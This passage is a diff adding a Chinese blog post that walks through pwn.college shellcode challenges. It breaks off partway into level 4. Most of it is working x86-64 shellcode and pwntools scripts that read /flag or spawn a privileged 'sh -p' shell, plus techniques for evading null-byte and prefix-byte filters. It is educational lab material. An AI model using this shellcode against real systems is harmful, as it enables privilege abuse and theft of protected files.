@@ -1,0 +1,1207 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    
+    <meta property="og:site_name" content="#3">
+    <meta property="og:type" content="article">
+
+    
+    <meta property="og:image" content="img/photomode_30112022_224031.png">
+    <meta property="twitter:image" content="img/photomode_30112022_224031.png" />
+    
+
+    
+    <meta name="title" content="pwn.college shellcode篇writeup" />
+    <meta property="og:title" content="pwn.college shellcode篇writeup" />
+    <meta property="twitter:title" content="pwn.college shellcode篇writeup" />
+    
+
+    
+    <meta name="description" content="Zephyr&#39;s blog">
+    <meta property="og:description" content="Zephyr&#39;s blog" />
+    <meta property="twitter:description" content="Zephyr&#39;s blog" />
+    
+
+    
+    <meta property="twitter:card" content="summary" />
+    
+    
+
+    <meta name="keyword"  content="Zephyr, zhaohuabing, Zhaohuabing, , Zephyr的网络日志, Zephyr的博客, Zhaohuabing Blog, 博客, 个人网站, 互联网, Web, CTF,">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>pwn.college shellcode篇writeup | Zephyr的博客 | Zephyr Blog</title>
+
+    <link rel="canonical" href="/shellcode/">
+
+    
+    
+    
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    
+    <link rel="stylesheet" href="/css/hugo-theme-cleanwhite.min.css">
+
+    
+    <link rel="stylesheet" href="/css/zanshang.css">
+
+    
+    <link rel="stylesheet" href="/css/font-awesome.all.min.css">
+
+    
+    
+
+    
+    <script src="/js/jquery.min.js"></script>
+
+    
+    <script src="/js/bootstrap.min.js"></script>
+
+    
+    <script src="/js/hux-blog.min.js"></script>
+
+    
+    <script src="/js/lazysizes.min.js"></script>
+
+    
+    
+ 
+ <script>
+    MathJax = {
+      tex: {
+        inlineMath: [
+          ["$", "$"],
+          ["\\(", "\\)"],
+        ],
+        displayMath: [
+          ["$$", "$$"],
+          ["\\[", "\\]"],
+        ],
+        processEscapes: true,
+        processEnvironments: true,
+      },
+      options: {
+        skipHtmlTags: ["script", "noscript", "style", "textarea", "pre"],
+      },
+    };
+  
+    window.addEventListener("load", (event) => {
+      document.querySelectorAll("mjx-container").forEach(function (x) {
+        x.parentElement.classList += "has-jax";
+      });
+    });
+  </script>
+  <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+  <script
+    type="text/javascript"
+    id="MathJax-script"
+    async
+    src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"
+  ></script>
+</head>
+<style>
+    code.has-jax {
+      -webkit-font-smoothing: antialiased;
+      background: inherit !important;
+      border: none !important;
+      font-size: 100%;
+    }
+    </style>
+
+
+
+
+
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+
+    <div class="container-fluid">
+        
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">#3</a>
+        </div>
+
+        
+        
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">All Posts</a>
+                    </li>
+                    
+                        
+                        <li>
+                            <a href="/categories/tech/">tech</a>
+                        </li>
+                        
+                    
+                    
+		    
+                        <li><a href="/about//">ABOUT</a></li>
+                    
+                        <li><a href="/course//">HISTORY</a></li>
+                    
+		            <li>
+                        <a href="/search"><i class="fa fa-search"></i></a>
+		           </li>
+                </ul>
+            </div>
+        </div>
+        
+    </div>
+    
+</nav>
+<script>
+    
+    
+    
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        
+            $navbar.className = " ";
+            
+            setTimeout(function(){
+                
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+
+
+<style type="text/css">
+    header.intro-header {
+        background-image: url('/img/photomode_30112022_224031.png')
+    }
+</style>
+
+<header class="intro-header" >
+
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                        <a class="tag" href="/tags/ctf" title="CTF">
+                            CTF
+                        </a>
+                        
+                        <a class="tag" href="/tags/pwn" title="Pwn">
+                            Pwn
+                        </a>
+                        
+                    </div>
+                    <h1>pwn.college shellcode篇writeup</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        
+                            Posted by 
+                            
+                                Zephyr
+                             
+                            on 
+                            Thursday, April 11, 2024
+                            
+                            
+                            
+                            
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+
+
+
+<article>
+    <div class="container">
+        <div class="row">
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                
+                <h1 id="前言">前言</h1>
+<p>我通过<a href="https://chinggg.github.io/post/pwncollege/">拼搏百天，我在pwn.college拿到了蓝带——黑客、开源和CS教育的革新</a>一文中了解到<code>pwn.college</code>， 经过简单的学习发现其后半段题目有一定难度，于是总结了shellcode篇以及部分memoryerror篇的writeup。</p>
+<h1 id="shellcode">shellcode</h1>
+<h2 id="level-1">level 1</h2>
+<p>1：无过滤</p>
+<p>根据前置知识，第一关就是小试牛刀了，因为什么过滤也没有，可以直接执行你输入的shellcode。</p>
+<p>这里可以直接用上面的读取flag的easy shellcode，汇编后用objcopy提取出来指令后运行即可：</p>
+<pre tabindex="0"><code>##生成二进制程序a.out
+gcc -nostdlib -static 1.s
+
+##提取机器代码b.bin
+objcopy --dump-section .text=b.bin a.out
+
+##运行挑战程序并运行shellcode：
+cat b.bin | /challenge/babyshell_level1
+</code></pre><p>另外可以使用python的pwntools，可以自动生成shellcode，就不需要我们自己编写了，如下：</p>
+<pre tabindex="0"><code>##!/usr/bin/python
+##encoding=utf-8
+
+from pwn import *
+context(arch = &#39;amd64&#39; , os = &#39;linux&#39;)
+
+##assembly = shellcraft.sh()	##sh的shellcode
+assembly = shellcraft.cat(&#34;/flag&#34;)	##直接读取flag
+
+assemed=asm(assembly)
+sh=process(f&#34;/challenge/{os.getenv(&#39;HOSTNAME&#39;)}&#34;)
+sh.send(assemed)
+sh.interactive()
+</code></pre><p>通过shellcraft读取flag的方式有好几种，如下：</p>
+<p>其他讲解还得看人家官方文档：http://docs.pwntools.com/en/stable/shellcraft/amd64.html</p>
+<pre tabindex="0"><code>##直接调用cat读取，它的利用是open()-&gt;sendfileto()：
+shellcraft.cat(&#34;/flag&#34;)
+
+##用open、read、write：
+shellcode = shellcraft.open(&#39;/flag&#39;)
+shellcode += shellcraft.read(&#39;rax&#39;,&#39;rsp&#39;,100)
+shellcode += shellcraft.write(1,&#39;rsp&#39;,100)
+</code></pre><p>直接执行sh后没有root权限也不能读/flag，需要加-p参数。</p>
+<p>想要进行交互时shell运行程序还需要cat在读取完文件后，还需要读取输入，所以需要这样执行：</p>
+<pre tabindex="0"><code>cat 1.bin - | /challenge/babyshell_level*
+</code></pre><p>shellcraft.sh()生成的shellcode如下：</p>
+<pre tabindex="0"><code>/* execve(path=&#39;/bin///sh&#39;, argv=[&#39;sh&#39;], envp=0) */
+    /* push b&#39;/bin///sh\x00&#39; */
+    push 0x68
+    mov rax, 0x732f2f2f6e69622f
+    push rax
+    mov rdi, rsp
+    /* push argument array [&#39;sh\x00&#39;] */
+    /* push b&#39;sh\x00&#39; */
+    push 0x1010101 ^ 0x6873
+    xor dword ptr [rsp], 0x1010101
+    xor esi, esi /* 0 */
+    push rsi /* null terminate */
+    push 8
+    pop rsi
+    add rsi, rsp
+    push rsi /* &#39;sh\x00&#39; */
+    mov rsi, rsp
+    xor edx, edx /* 0 */
+    /* call execve() */
+    push SYS_execve /* 0x3b */
+    pop rax
+    syscall
+</code></pre><p>我觉得更好用的还是push相关的函数如<code>shellcraft.pushstr()</code>，可以自动生成push进栈的汇编代码，我们执行后直接利用rsp的值就可以传参了，如下：</p>
+<p>还有一个是<code>shellcraft.pushstr_array()</code>，这个更好用，直接能把字符串序列推入栈，还能自动把字符串地址放入指定的寄存器，两个参数，第一个是寄存器，第二个是字符串序列，如下：</p>
+<pre tabindex="0"><code>&gt;&gt;&gt; print(shellcraft.pushstr(b&#39;/bin/sh&#39;))
+    /* push b&#39;/bin/sh\x00&#39; */
+    mov rax, 0x101010101010101
+    push rax
+    mov rax, 0x101010101010101 ^ 0x68732f6e69622f
+    xor [rsp], rax
+
+&gt;&gt;&gt; print(shellcraft.pushstr_array(&#34;rsi&#34;,[&#34;sh&#34;,&#34;-p&#34;]))
+    /* push argument array [&#39;sh\x00&#39;, &#39;-p\x00&#39;] */
+    /* push b&#39;sh\x00-p\x00&#39; */
+    mov rax, 0x101010101010101
+    push rax
+    mov rax, 0x101010101010101 ^ 0x702d006873
+    xor [rsp], rax
+    xor esi, esi /* 0 */
+    push rsi /* null terminate */
+    push 0xb
+    pop rsi
+    add rsi, rsp
+    push rsi /* &#39;-p\x00&#39; */
+    push 0x10
+    pop rsi
+    add rsi, rsp
+    push rsi /* &#39;sh\x00&#39; */
+    mov rsi, rsp
+</code></pre><p>所以我们可以把上面的sh代码改一下，改成加上<code>-p</code>参数的，这样我们就可以使用euid=0的权限了，nice！：</p>
+<p>（后来发现可以直接用<code>shellcraft.execve('sh',['sh','-p'])</code>来生成）</p>
+<pre tabindex="0"><code>/* execve(path=&#39;/bin///sh&#39;, argv=[&#39;sh&#39;,&#39;-p&#39;], envp=0) */
+    /* push b&#39;/bin///sh\x00&#39; */
+    push 0x68
+    mov rax, 0x732f2f2f6e69622f
+    push rax
+    mov rdi, rsp
+    /* push argument array [&#39;sh\x00&#39;, &#39;-p\x00&#39;] */
+    /* push b&#39;sh\x00-p\x00&#39; */
+    mov rax, 0x101010101010101
+    push rax
+    mov rax, 0x101010101010101 ^ 0x702d006873
+    xor [rsp], rax
+    xor esi, esi /* 0 */
+    push rsi /* null terminate */
+    push 0xb
+    pop rsi
+    add rsi, rsp
+    push rsi /* &#39;-p\x00&#39; */
+    push 0x10
+    pop rsi
+    add rsi, rsp
+    push rsi /* &#39;sh\x00&#39; */
+</code></pre><h4 id="nop-sled">nop sled</h4>
+<p>用nop跳过，可以应对随机丢失的问题。</p>
+<p>在 GAS 中，您可以使用 <strong><code>.rept</code></strong> 和 <strong><code>.endr</code></strong> 指令来创建重复的指令。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>.intel_syntax noprefix
+</span></span><span style="display:flex;"><span>.global _start
+</span></span><span style="display:flex;"><span>.text
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>_start<span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>    .rept <span style="color:#bd93f9">0x800</span>
+</span></span><span style="display:flex;"><span>        nop
+</span></span><span style="display:flex;"><span>    .endr
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ## 将 <span style="color:#f1fa8c">&#34;/flag&#34;</span> 推入栈
+</span></span><span style="display:flex;"><span>    mov rax, <span style="color:#bd93f9">0x67616c662f</span>     ## <span style="color:#f1fa8c">&#34;/flag&#34;</span> 的 ASCII 码
+</span></span><span style="display:flex;"><span>    push rax                  ## 将 <span style="color:#f1fa8c">&#34;/flag&#34;</span> 压入栈
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ## 执行系统调用 open(<span style="color:#f1fa8c">&#34;/flag&#34;</span>, O_RDONLY)
+</span></span><span style="display:flex;"><span>    mov rax, <span style="color:#bd93f9">2</span>                ## 系统调用号：<span style="color:#bd93f9">2</span> (open)
+</span></span><span style="display:flex;"><span>    mov rdi, rsp              ## 第一个参数：指向栈顶的指针（即 <span style="color:#f1fa8c">&#34;/flag&#34;</span>）
+</span></span><span style="display:flex;"><span>    xor rsi, rsi              ## 第二个参数：<span style="color:#bd93f9">0</span> (O_RDONLY)
+</span></span><span style="display:flex;"><span>    syscall                   ## 执行系统调用 open
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ## 使用 sendfile 将文件内容发送到 stdout
+</span></span><span style="display:flex;"><span>    mov rdi, <span style="color:#bd93f9">1</span>                ## 第一个参数：stdout 文件描述符
+</span></span><span style="display:flex;"><span>    mov rsi, rax              ## 第二个参数：open 返回的文件描述符
+</span></span><span style="display:flex;"><span>    xor rdx, rdx              ## 第三个参数：文件内的起始偏移
+</span></span><span style="display:flex;"><span>    mov r10, <span style="color:#bd93f9">1000</span>             ## 第四个参数：传输的字节数
+</span></span><span style="display:flex;"><span>    mov rax, <span style="color:#bd93f9">40</span>               ## 系统调用号：<span style="color:#bd93f9">40</span> (sendfile)
+</span></span><span style="display:flex;"><span>    syscall                   ## 执行系统调用 sendfile
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ## 退出
+</span></span><span style="display:flex;"><span>    mov rax, <span style="color:#bd93f9">60</span>               ## 系统调用号：<span style="color:#bd93f9">60</span> (exit)
+</span></span><span style="display:flex;"><span>    xor rdi, rdi              ## 第一个参数：退出状态码 <span style="color:#bd93f9">0</span>
+</span></span><span style="display:flex;"><span>    syscall                   ## 执行系统调用 exit
+</span></span></code></pre></div><h2 id="level-3">level 3</h2>
+<p>机器码中不能出现00，因此不能用.string 可以考虑利用寄存器拼接</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>xor rax, rax         ## 清零 rax 寄存器
+</span></span><span style="display:flex;"><span>mov al, <span style="color:#bd93f9">0x67</span>         ## 将 al (rax 的低8位) 设置为 <span style="color:#bd93f9">0x67</span> (<span style="color:#f1fa8c">&#39;g&#39;</span>)
+</span></span><span style="display:flex;"><span>shl rax, <span style="color:#bd93f9">0x20</span>        ## 将 rax 左移 <span style="color:#bd93f9">32</span> 位，将 <span style="color:#f1fa8c">&#39;g&#39;</span> 放到 rax 的高32位
+</span></span><span style="display:flex;"><span>xor rbx, rbx         ## 清零 rbx 寄存器
+</span></span><span style="display:flex;"><span>mov ebx, <span style="color:#bd93f9">0x616c662f</span>  ## 将 ebx 设置为 <span style="color:#bd93f9">0x616c662f</span> (<span style="color:#f1fa8c">&#39;/flag&#39;</span> 的 ASCII 值，倒序)
+</span></span><span style="display:flex;"><span>add rbx, rax         ## 将 rax 加到 rbx，组合成整个字符串 <span style="color:#f1fa8c">&#39;/flag&#39;</span> 存储于 rbx
+</span></span><span style="display:flex;"><span>push rbx             ## 将 <span style="color:#f1fa8c">&#39;/flag&#39;</span> 推入栈
+</span></span><span style="display:flex;"><span>xor rax, rax         ## 清零 rax 寄存器
+</span></span><span style="display:flex;"><span>mov al, <span style="color:#bd93f9">2</span>            ## 设置系统调用号为 <span style="color:#bd93f9">2</span> (sys_open)
+</span></span><span style="display:flex;"><span>mov rdi, rsp         ## 设置 rdi 为栈顶地址，即 <span style="color:#f1fa8c">&#34;/flag&#34;</span> 字符串的地址
+</span></span><span style="display:flex;"><span>xor rsi, rsi         ## 设置 rsi 为 <span style="color:#bd93f9">0</span>，表示打开文件的标志为 O_RDONLY
+</span></span><span style="display:flex;"><span>syscall              ## 执行系统调用 (open)
+</span></span><span style="display:flex;"><span>xor rdi, rdi         ## 清零 rdi 寄存器
+</span></span><span style="display:flex;"><span>inc rdi              ## rdi 增加 <span style="color:#bd93f9">1</span>，设置为 <span style="color:#bd93f9">1</span> (标准输出)
+</span></span><span style="display:flex;"><span>mov rsi, rax         ## 将上一次调用 open 的返回值（文件描述符）移动到 rsi
+</span></span><span style="display:flex;"><span>xor rdx, rdx         ## 清零 rdx 寄存器，设置偏移为 <span style="color:#bd93f9">0</span>
+</span></span><span style="display:flex;"><span>xor rax, rax         ## 清零 rax 寄存器
+</span></span><span style="display:flex;"><span>mov al, <span style="color:#bd93f9">0xff</span>         ## 将 al 设置为 <span style="color:#bd93f9">0xff</span> (<span style="color:#bd93f9">255</span>)，尝试发送 <span style="color:#bd93f9">255</span> 字节，这里是一个误差
+</span></span><span style="display:flex;"><span>mov r10, rax         ## 将 rax 的值移动到 r10，即 r10 也是 <span style="color:#bd93f9">255</span>
+</span></span><span style="display:flex;"><span>xor rax, rax         ## 再次清零 rax 寄存器
+</span></span><span style="display:flex;"><span>mov al, <span style="color:#bd93f9">0x28</span>         ## 设置系统调用号为 <span style="color:#bd93f9">40</span> (sys_sendfile)
+</span></span><span style="display:flex;"><span>syscall              ## 执行系统调用 (sendfile)
+</span></span><span style="display:flex;"><span>xor rax, rax         ## 清零 rax 寄存器
+</span></span><span style="display:flex;"><span>mov al, <span style="color:#bd93f9">0x3c</span>         ## 设置系统调用号为 <span style="color:#bd93f9">60</span> (sys_exit)
+</span></span><span style="display:flex;"><span>syscall              ## 执行系统调用 (exit)
+</span></span></code></pre></div><p>这里</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>xor rdi, rdi         ## 清零 rdi 寄存器
+</span></span><span style="display:flex;"><span>inc rdi              ## rdi 增加 <span style="color:#bd93f9">1</span>，设置为 <span style="color:#bd93f9">1</span> (标准输出)
+</span></span></code></pre></div><p>可以避免出0</p>
+<p>另外用</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>mov al, <span style="color:#bd93f9">0xff</span>         ## 将 al 设置为 <span style="color:#bd93f9">0xff</span> (<span style="color:#bd93f9">255</span>)，尝试发送 <span style="color:#bd93f9">255</span> 字节，这里是一个误差
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>objdump <span style="color:#ff79c6">-</span>d <span style="color:#ff79c6">-</span>M intel shellcode
+</span></span></code></pre></div><p>可以单独操作一个字节</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>     Address      <span style="color:#ff79c6">|</span>                      Bytes                    <span style="color:#ff79c6">|</span>          Instructions
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">------------------------------------------------------------------------------------------</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x000000001b3f0000</span> <span style="color:#ff79c6">|</span> <span style="color:#bd93f9">48</span> <span style="color:#bd93f9">31</span> c0                                      <span style="color:#ff79c6">|</span> xor rax, rax
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x000000001b3f0003</span> <span style="color:#ff79c6">|</span> b0 <span style="color:#bd93f9">67</span>                                         <span style="color:#ff79c6">|</span> mov al, <span style="color:#bd93f9">0x67</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x000000001b3f0005</span> <span style="color:#ff79c6">|</span> <span style="color:#bd93f9">48</span> c1 e0 <span style="color:#bd93f9">20</span>                                   <span style="color:#ff79c6">|</span> shl rax, <span style="color:#bd93f9">0x20</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x000000001b3f0009</span> <span style="color:#ff79c6">|</span> <span style="color:#bd93f9">48</span> <span style="color:#bd93f9">31</span> db                                      <span style="color:#ff79c6">|</span> xor rbx, rbx
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x000000001b3f000c</span> <span style="color:#ff79c6">|</span> bb <span style="color:#bd93f9">2</span>f <span style="color:#bd93f9">66</span> <span style="color:#bd93f9">6</span>c <span style="color:#bd93f9">61</span>                                <span style="color:#ff79c6">|</span> mov ebx, <span style="color:#bd93f9">0x616c662f</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x000000001b3f0011</span> <span style="color:#ff79c6">|</span> <span style="color:#bd93f9">48</span> <span style="color:#bd93f9">01</span> c3                                      <span style="color:#ff79c6">|</span> add rbx, rax
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x000000001b3f0014</span> <span style="color:#ff79c6">|</span> <span style="color:#bd93f9">53</span>                                            <span style="color:#ff79c6">|</span> push rbx
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x000000001b3f0015</span> <span style="color:#ff79c6">|</span> <span style="color:#bd93f9">48</span> <span style="color:#bd93f9">31</span> c0                                      <span style="color:#ff79c6">|</span> xor rax, rax
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x000000001b3f0018</span> <span style="color:#ff79c6">|</span> b0 <span style="color:#bd93f9">02</span>                                         <span style="color:#ff79c6">|</span> mov al, <span style="color:#bd93f9">2</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x000000001b3f001a</span> <span style="color:#ff79c6">|</span> <span style="color:#bd93f9">48</span> <span style="color:#bd93f9">89</span> e7                                      <span style="color:#ff79c6">|</span> mov rdi, rsp
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x000000001b3f001d</span> <span style="color:#ff79c6">|</span> <span style="color:#bd93f9">48</span> <span style="color:#bd93f9">31</span> f6                                      <span style="color:#ff79c6">|</span> xor rsi, rsi
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x000000001b3f0020</span> <span style="color:#ff79c6">|</span> <span style="color:#bd93f9">0</span>f <span style="color:#bd93f9">05</span>                                         <span style="color:#ff79c6">|</span> syscall 
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x000000001b3f0022</span> <span style="color:#ff79c6">|</span> <span style="color:#bd93f9">48</span> <span style="color:#bd93f9">31</span> ff                                      <span style="color:#ff79c6">|</span> xor rdi, rdi
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x000000001b3f0025</span> <span style="color:#ff79c6">|</span> <span style="color:#bd93f9">48</span> ff c7                                      <span style="color:#ff79c6">|</span> inc rdi
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x000000001b3f0028</span> <span style="color:#ff79c6">|</span> <span style="color:#bd93f9">48</span> <span style="color:#bd93f9">89</span> c6                                      <span style="color:#ff79c6">|</span> mov rsi, rax
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x000000001b3f002b</span> <span style="color:#ff79c6">|</span> <span style="color:#bd93f9">48</span> <span style="color:#bd93f9">31</span> d2                                      <span style="color:#ff79c6">|</span> xor rdx, rdx
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x000000001b3f002e</span> <span style="color:#ff79c6">|</span> <span style="color:#bd93f9">48</span> <span style="color:#bd93f9">31</span> c0                                      <span style="color:#ff79c6">|</span> xor rax, rax
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x000000001b3f0031</span> <span style="color:#ff79c6">|</span> b0 ff                                         <span style="color:#ff79c6">|</span> mov al, <span style="color:#bd93f9">0xff</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x000000001b3f0033</span> <span style="color:#ff79c6">|</span> <span style="color:#bd93f9">49</span> <span style="color:#bd93f9">89</span> c2                                      <span style="color:#ff79c6">|</span> mov r10, rax
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x000000001b3f0036</span> <span style="color:#ff79c6">|</span> <span style="color:#bd93f9">48</span> <span style="color:#bd93f9">31</span> c0                                      <span style="color:#ff79c6">|</span> xor rax, rax
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x000000001b3f0039</span> <span style="color:#ff79c6">|</span> b0 <span style="color:#bd93f9">28</span>                                         <span style="color:#ff79c6">|</span> mov al, <span style="color:#bd93f9">0x28</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x000000001b3f003b</span> <span style="color:#ff79c6">|</span> <span style="color:#bd93f9">0</span>f <span style="color:#bd93f9">05</span>                                         <span style="color:#ff79c6">|</span> syscall 
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x000000001b3f003d</span> <span style="color:#ff79c6">|</span> <span style="color:#bd93f9">48</span> <span style="color:#bd93f9">31</span> c0                                      <span style="color:#ff79c6">|</span> xor rax, rax
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x000000001b3f0040</span> <span style="color:#ff79c6">|</span> b0 <span style="color:#bd93f9">3</span>c                                         <span style="color:#ff79c6">|</span> mov al, <span style="color:#bd93f9">0x3c</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x000000001b3f0042</span> <span style="color:#ff79c6">|</span> <span style="color:#bd93f9">0</span>f <span style="color:#bd93f9">05</span>                                         <span style="color:#ff79c6">|</span> syscall 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Executing shellcode<span style="color:#ff79c6">!</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pwn.college{sQ<span style="color:#ff79c6">-</span>O07u1QVqVaMssM9AiroI4xOg<span style="color:#bd93f9">.0</span>VOxIDL3IDNyUzW}
+</span></span></code></pre></div><h4 id="不同byte大小的寄存器">不同byte大小的寄存器</h4>
+<p>在x86-64架构中，寄存器有不同的大小和对应的名称，可以用来在汇编语言中进行不同长度数据的操作。这些寄存器可以操作从一个字节到八个字节的数据。以下是一些常用寄存器的不同大小及其对应的汇编语言操作示例：</p>
+<h6 id="1-一个字节的操作"><strong>1. 一个字节的操作</strong></h6>
+<p>对于单字节操作，我们通常使用寄存器的最低字节，例如 <strong><code>AL</code></strong>, <strong><code>BL</code></strong>, <strong><code>CL</code></strong>, <strong><code>DL</code></strong>（这些是更大寄存器的低8位）：</p>
+<pre tabindex="0"><code>assemblyCopy code
+mov al, 0x1F    ; 将单字节值0x1F移入AL
+</code></pre><h6 id="2-两个字节的操作"><strong>2. 两个字节的操作</strong></h6>
+<p>对于两字节（16位）的操作，可以使用如 <strong><code>AX</code></strong>, <strong><code>BX</code></strong>, <strong><code>CX</code></strong>, <strong><code>DX</code></strong> 等寄存器：</p>
+<pre tabindex="0"><code>assemblyCopy code
+mov ax, 0x1F1F  ; 将两字节值0x1F1F移入AX
+</code></pre><h6 id="3-四个字节的操作"><strong>3. 四个字节的操作</strong></h6>
+<p>对于四字节（32位）的操作，使用的寄存器扩展到 <strong><code>EAX</code></strong>, <strong><code>EBX</code></strong>, <strong><code>ECX</code></strong>, <strong><code>EDX</code></strong>：</p>
+<pre tabindex="0"><code>assemblyCopy code
+mov eax, 0x1F1F1F1F  ; 将四字节值0x1F1F1F1F移入EAX
+</code></pre><h6 id="4-八个字节的操作"><strong>4. 八个字节的操作</strong></h6>
+<p>在x86-64架构中，可以直接操作整个64位的寄存器，如 <strong><code>RAX</code></strong>, <strong><code>RBX</code></strong>, <strong><code>RCX</code></strong>, <strong><code>RDX</code></strong>：</p>
+<pre tabindex="0"><code>assemblyCopy code
+mov rax, 0x1F1F1F1F1F1F1F1F  ; 将八字节值0x1F1F1F1F1F1F1F1F移入RAX
+</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>section .text
+</span></span><span style="display:flex;"><span>global _start
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>_start<span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>    xor eax, eax          ; 清零EAX
+</span></span><span style="display:flex;"><span>    mov al, <span style="color:#bd93f9">0xFF</span>          ; AL是EAX的低8位
+</span></span><span style="display:flex;"><span>    mov ax, <span style="color:#bd93f9">0xFFFF</span>        ; AX是EAX的低16位
+</span></span><span style="display:flex;"><span>    mov eax, <span style="color:#bd93f9">0xFFFFFFFF</span>   ; EAX是32位
+</span></span><span style="display:flex;"><span>    mov rax, <span style="color:#bd93f9">0xFFFFFFFFFFFFFFFF</span> ; RAX是64位
+</span></span><span style="display:flex;"><span>    ...
+</span></span></code></pre></div><h2 id="level-4">level 4</h2>
+<p>不让机器码出现 <code>H</code>，不让用H就是说不能用64位的mov及相关的xor, or, shl指令，但是可以用32位指令，而且push和pop到rax不影响。</p>
+<p>可以考虑</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span> push rsp
+</span></span><span style="display:flex;"><span>    pop rdi
+</span></span></code></pre></div><p>相当于</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>mov rdi,rsp
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>.intel_syntax noprefix
+</span></span><span style="display:flex;"><span>.global _start
+</span></span><span style="display:flex;"><span>.text
